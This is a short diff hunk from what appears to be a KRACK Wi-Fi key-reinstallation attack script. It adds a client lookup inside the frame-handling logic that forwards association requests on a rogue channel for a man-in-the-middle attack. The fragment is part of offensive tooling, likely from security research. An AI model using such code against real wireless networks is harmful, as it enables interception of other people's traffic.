@@ -479,6 +479,7 @@ class KRAckAttack():
 				will_forward = True
 			elif p.haslayer(Dot11AssoReq):
 				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
+				client = self.clients[p.addr2]
 				will_forward = True
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
